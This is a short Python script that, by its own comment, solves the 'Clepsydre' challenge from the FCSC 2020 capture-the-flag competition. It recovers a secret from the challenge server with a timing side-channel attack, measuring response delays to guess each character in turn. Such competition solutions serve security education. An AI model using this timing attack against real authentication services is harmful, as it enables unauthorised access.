import socket, string, time

HOSTNAME = "challenges2.france-cybersecurity-challenge.fr"
PORT = 6006

## This script resolves FCSC 2020's "Clepsydre" challenge  

charset = string.ascii_letters + string.digits + string.punctuation

flag = ''
for i in range(22):
    for c in charset:

        my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        my_sock.connect((HOSTNAME, PORT))

        msg = my_sock.recv(1024)

        flag = flag[0:i] + c

        debut = time.time()
        my_sock.sendall(flag.encode() + b'\n')
        msg = my_sock.recv(1024)

        fin = time.time()
        delta = fin - debut

        if delta >= 0.5 + i:
            print(i +1 , "\t", c)
            my_sock.close()
            break

        my_sock.close()

print(flag)